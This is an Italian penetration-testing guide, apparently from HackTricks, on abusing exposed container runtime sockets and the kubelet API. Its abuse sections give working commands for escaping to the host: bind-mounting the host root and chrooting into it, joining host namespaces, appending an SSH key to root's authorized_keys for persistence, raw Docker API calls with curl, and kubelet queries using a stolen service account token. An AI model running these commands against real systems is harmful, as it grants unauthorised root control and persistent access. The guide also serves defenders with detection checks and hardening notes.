# Esposizione delle API di runtime e dei daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molti compromissioni reali dei container non iniziano affatto con un namespace escape. Iniziano dall'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman o kubelet tramite un Unix socket montato o un listener TCP esposto, l'attaccante potrebbe essere in grado di richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, l'API del runtime è il vero confine di sicurezza e comprometterla equivale, di fatto, a compromettere l'host.

Per questo motivo, l'esposizione del runtime socket dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities e confinamento MAC ordinari può comunque trovarsi a una sola chiamata API dalla compromissione dell'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` è montato al suo interno. L'isolamento del kernel del container corrente potrebbe funzionare esattamente come previsto, mentre il management plane del runtime rimane completamente esposto.

## Modelli di accesso ai daemon

Docker Engine espone tradizionalmente la propria API privilegiata tramite il Unix socket locale `unix:///var/run/docker.sock`. Storicamente è stato esposto anche da remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS sulla porta `2376`. Esporre il daemon da remoto senza TLS robusto e autenticazione dei client trasforma di fatto l'API Docker in un'interfaccia root remota.

containerd, CRI-O, Podman e kubelet espongono superfici ad alto impatto simili. I nomi e i workflow differiscono, ma la logica rimane la stessa. Se l'interfaccia consente al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali o modificare container in esecuzione, tale interfaccia è un canale di gestione privilegiato e deve essere trattata di conseguenza.

I percorsi locali più comuni da controllare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o specializzati possono inoltre esporre endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Sono meno comuni negli ambienti moderni, ma quando vengono rilevati devono essere trattati con la stessa cautela, poiché rappresentano superfici di controllo del runtime e non normali socket applicativi.

## Accesso remoto sicuro

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e, preferibilmente, con l'autenticazione reciproca, in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di aprire il daemon Docker su HTTP non cifrato per comodità è uno degli errori più pericolosi nell'amministrazione dei container, perché la superficie API è abbastanza potente da creare direttamente container privilegiati.

Il pattern di configurazione storico di Docker era simile a:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sugli host basati su systemd, la comunicazione con il daemon può apparire anche come `fd://`, il che significa che il processo eredita un socket pre-aperto da systemd invece di associarlo direttamente. La lezione importante non riguarda la sintassi esatta, ma la conseguenza per la sicurezza. Nel momento in cui il daemon ascolta al di là di un socket locale con permessi rigorosamente limitati, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie anziché essere misure di hardening facoltative.

## Abuso

Se è presente un socket runtime, verifica quale sia, se esista un client compatibile e se sia possibile accedere tramite HTTP raw o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un percorso inesistente, un socket montato ma inaccessibile e una API privilegiata attiva. Se il client ha successo, la domanda successiva è se l'API può avviare un nuovo container con un bind mount dell'host o la condivisione del namespace dell'host.

### Quando non è installato alcun client

L'assenza di `docker`, `podman` o di un'altra CLI intuitiva non significa che il socket sia sicuro. Docker Engine comunica tramite HTTP sul proprio socket Unix, mentre Podman espone sia una API compatibile con Docker sia una API nativa Libpod tramite `podman system service`. Ciò significa che un ambiente minimale con solo `curl` potrebbe essere comunque sufficiente per interagire con il daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Questo è importante durante la post-exploitation perché i defender a volte rimuovono i consueti client binaries, ma lasciano montato il management socket. Sugli host Podman, ricordate che il path di alto valore differisce tra deployment rootful e rootless: `unix:///run/podman/podman.sock` per le istanze di servizio rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` per quelle rootless.

### Esempio completo: dal Docker Socket alla root dell'host

Se `docker.sock` è raggiungibile, l'escape classico consiste nell'avviare un nuovo container che monta il filesystem root dell'host e poi eseguire `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo consente l'esecuzione diretta con privilegi root sull'host tramite il daemon Docker. L'impatto non si limita alla lettura dei file. Una volta entrato nel nuovo container, l'attacker può modificare i file dell'host, raccogliere credenziali, installare persistence o avviare ulteriori workload privilegiati.

### Esempio completo: dal socket Docker ai namespace dell'host

Se l'attacker preferisce entrare nei namespace invece di limitarsi all'accesso al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con un'esposizione esplicita dei namespace dell'host, invece di sfruttare quello corrente.

### Pattern di persistenza del Docker Socket

Il controllo del runtime può essere utilizzato anche per la persistenza, anziché per una shell one-shot. Il pattern generico consiste nel creare un container di supporto con un mount dell'host, scrivere materiale di accesso autorizzato o un hook di avvio nel filesystem dell'host montato e quindi verificare che l'host lo utilizzi.

Struttura di esempio:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La stessa idea può colpire le unità systemd, i frammenti cron, i file di avvio delle applicazioni o le chiavi SSH, a seconda di ciò che l’operatore vuole dimostrare. Il punto importante è che la modifica persistente viene effettuata tramite l’autorità del daemon di runtime sul filesystem dell’host, non tramite privilegi aggiuntivi nel container originale.

### Pivot tramite Raw Docker API Helper

Quando la CLI Docker non è disponibile, lo stesso flusso dell’helper con host-mount può essere eseguito tramite HTTP sul socket Unix. Il flusso generico è: confermare l’API, creare un container helper con un bind mount dell’host, avviarlo, creare un’exec instance e avviare quell’exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La richiesta finale `/exec/<id>/start` dipende dall'ID exec restituito, ma il punto di sicurezza è indipendente dall'esatta gestione JSON: l'accesso raw alle API a un Docker daemon rootful è sufficiente per richiedere un workload helper con privilegi maggiori.

### Esempio completo: socket containerd

Un socket `containerd` montato è solitamente altrettanto pericoloso:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Se è presente un client più simile a Docker, `nerdctl` può essere più pratico di `ctr` perché espone flag familiari come `--privileged`, `--pid=host` e `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L'impatto è ancora una volta la compromissione dell'host. Anche se gli strumenti specifici di Docker sono assenti, un'altra runtime API potrebbe comunque offrire lo stesso potere amministrativo. Sui nodi Kubernetes, anche `crictl` potrebbe essere sufficiente per la ricognizione e l'interazione con i container, perché comunica direttamente con l'endpoint CRI.

### BuildKit Socket

`buildkitd` è facile da trascurare perché spesso viene considerato "solo il backend di build", ma il daemon è comunque un control plane privilegiato. Un `buildkitd.sock` raggiungibile può consentire a un attaccante di eseguire arbitrary build steps, ispezionare le capacità dei worker, utilizzare contesti locali dell'ambiente compromesso e richiedere entitlements pericolosi come `network.host` o `security.insecure` quando il daemon è stato configurato per consentirli.

Le prime interazioni utili sono:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Se il daemon accetta richieste di build, verifica se sono disponibili entitlements non sicuri:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L'impatto esatto dipende dalla configurazione del daemon, ma un servizio BuildKit rootful con entitlements permissive non è una semplice comodità innocua per gli sviluppatori. Trattalo come un'altra superficie amministrativa di alto valore, soprattutto sui CI runner e sui nodi di build condivisi.

### API Kubelet su TCP

Il kubelet non è un container runtime, ma fa comunque parte del piano di gestione del nodo e spesso rientra nella stessa discussione sui confini di trust. Se la porta sicura del kubelet `10250` è raggiungibile dal workload, oppure se sono esposte credenziali del nodo, kubeconfig o autorizzazioni di proxy, l'attacker potrebbe essere in grado di enumerare i Pod, recuperare i log o eseguire comandi nei container locali del nodo senza mai interagire con il percorso di admission dell'API server Kubernetes.

Inizia con una discovery economica:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Se il percorso proxy di kubelet o API-server autorizza `exec`, un client compatibile con WebSocket può trasformarlo in code execution in altri container sul nodo. Questo spiega anche perché `nodes/proxy` con la sola autorizzazione `get` sia più pericoloso di quanto sembri: la richiesta può comunque raggiungere endpoint di kubelet che eseguono comandi, e queste interazioni dirette con kubelet non compaiono nei normali audit log di Kubernetes.<sup>[[2]](#references)</sup>

## Controlli

L'obiettivo di questi controlli è stabilire se il container può raggiungere un management plane che avrebbe dovuto rimanere al di fuori del confine di trust.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Cosa è interessante qui:

- Un runtime socket montato è solitamente una primitiva amministrativa diretta, non una semplice divulgazione di informazioni.
- Un listener TCP sulla porta `2375` senza TLS deve essere trattato come una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato progettato intenzionalmente per comunicare con il runtime dell'host.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Unix socket locale per impostazione predefinita | `dockerd` ascolta sul socket locale e il daemon è solitamente rootful | montare `/var/run/docker.sock`, esporre `tcp://...:2375`, TLS debole o assente su `2376` |
| Podman | CLI daemonless per impostazione predefinita | Per l'uso locale ordinario non è richiesto alcun daemon privilegiato persistente; gli API socket possono comunque essere esposti quando `podman system service` è abilitato | esporre `podman.sock`, eseguire il service in modo ampio, usare le API rootful |
| containerd | Socket locale privilegiato | L'API amministrativa è esposta tramite il socket locale e solitamente utilizzata da strumenti di livello superiore | montare `containerd.sock`, accesso ampio a `ctr` o `nerdctl`, esporre namespace privilegiati |
| CRI-O | Socket locale privilegiato | L'endpoint CRI è destinato a componenti trusted locali al nodo | montare `crio.sock`, esporre l'endpoint CRI a workload non trusted |
| Kubernetes kubelet | API di gestione locale al nodo | Kubelet non dovrebbe essere ampiamente raggiungibile dai Pod; l'accesso può esporre lo stato dei pod, credenziali e funzionalità di esecuzione a seconda di authn/authz | montare socket o certificati del kubelet, autenticazione debole del kubelet, host networking insieme a un endpoint kubelet raggiungibile |

## References

- [1] [sfruttamento del socket di containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [rischi di bypass dell'API Server di Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
